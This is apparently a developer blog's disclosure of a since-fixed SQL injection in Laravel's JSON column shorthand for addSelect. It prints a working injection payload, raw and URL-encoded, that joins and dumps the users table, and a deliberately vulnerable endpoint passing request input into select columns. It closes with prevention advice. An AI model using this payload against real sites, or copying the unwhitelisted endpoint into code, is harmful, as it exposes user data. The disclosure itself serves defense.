**Important**: this vulnerability has been fixed and merged in [the 5.8 branch](*https://github.com/laravel/framework/pull/28160).

Laravel has the ability to manually specify which columns to select on a query.
It also offers a nice shorthand to work with JSON data:

```
<hljs type>Blog</hljs>::<hljs prop>query</hljs>()
    -><hljs prop>addSelect</hljs>('<hljs green>title</hljs>-><hljs blue>en</hljs>');
```

```
<hljs keyword>SELECT JSON_EXTRACT</hljs>(`<hljs green>title</hljs>`, '$."<hljs blue>en</hljs>"') FROM blogs;
```

Instead of manually writing `JSON_EXTRACT`, we can use the simplified `->` syntax, 
which Laravel will convert to the correct SQL statement.

Be careful though: Laravel won't do any escaping during this conversion. 
Consider the following example:

```
<hljs type>Blog</hljs>::<hljs prop>query</hljs>()
    -><hljs prop>addSelect</hljs>('<hljs green>title</hljs>-><hljs blue>en</hljs><hljs red>'#</hljs>');
```

By inserting `'#` in our input, we can manually close the `JSON_EXTRACT` function, 
and ignore the rest of the query:

```
<hljs keyword>SELECT JSON_EXTRACT</hljs>(`<hljs green>title</hljs>`, '$."<hljs blue>en</hljs><hljs red>'#</hljs><hljs textgrey>"') FROM blogs;</hljs>
```

This query will fail, but what about the next one?

```
<hljs keyword>SELECT JSON_EXTRACT</hljs>(
    `<hljs green>title</hljs>`, 
    '$."<hljs blue>en</hljs><hljs red>"')) 
FROM blogs RIGHT OUTER JOIN users ON users.id <> null
#</hljs>
    <hljs textgrey>"') FROM blogs;</hljs>
```

We're adding an outer join on the `users` table. 
Essentially selecting all data in it. 

For reference, here is the URL encoded version of the malicious code:

```
<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>
```

Say we have the following endpoint in our application, to query blog posts from a public API:

```php
<hljs type>Route</hljs>::<hljs prop>get</hljs>('/posts', function (<hljs type>Request</hljs> $request) {
    $fields = $request-><hljs prop>get</hljs>('fields', []);

    $users = <hljs type>Blog</hljs>::<hljs prop>query</hljs>()-><hljs prop>addSelect</hljs>($fields)-><hljs prop>get</hljs>();

    return <hljs prop>response</hljs>()-><hljs prop>json</hljs>($users);
});
```

Users of this API might only be interested in a few fields, 
that's why we added a `fields` filter.

The endpoint can now be used like this:

```
/blog?fields[]=url&fields[]=title
```

What if we inserted our malicious code instead?

```
/blog?fields[]=<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>
```

It will be added to the query. And by returning the query result as JSON, 
we'll see the full contents of the users table. 

```php
<hljs type>Blog</hljs>::<hljs prop>query</hljs>()-><hljs prop>addSelect</hljs>([
    '<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>'
])-><hljs prop>get</hljs>();
```

Two things need to be in place for this attack to be possible:

- An accessible API endpoint, which allows an attacker to write to the `addSelect` or `select`.
Chances are you're not doing this manually in your project.
Though there are popular packages which allow this functionality to provide easy API endpoints.
A popular spec that inspires lots of API related packages is the JSON API spec. It specifically allows for [sparse fieldsets](*https://jsonapi.org/format/#fetching-sparse-fieldsets).
- The entry point table must have a column with JSON data. 
Otherwise the `JSON_EXTRACT` function will fail, stopping our query. 
From the entry point though, you can access all data.

{{ ad }}

## Prevention?

Be sure you update to the latest Laravel 5.8 version, as soon as the fix has been tagged.
It's already [merged](*https://github.com/laravel/framework/pull/28160), but not yet tagged.

Even more importantly, you should never allow user input directly to specify columns, without a whitelist.
In our previous example, you could specify which fields are allowed to be requested, instead of accepting all input.

Next, one of our widely-used packages, `spatie/laravel-querybuilder`, 
opened up `addSelect` by design. 
This meant that websites using our package, were vulnerable to the underlying issue.
We immediately fixed it and Freek [wrote about it](*https://murze.be/an-important-security-release-for-laravel-query-builder) in depth.
If you're using our package and unable to update to the latest Laravel version, 
you should immediately update the package.

Finally, the [Laravel docs](*https://laravel.com/docs/5.8/queries) have also been updated 
to warn developers not to pass user input directly to columns when using the query builder. 
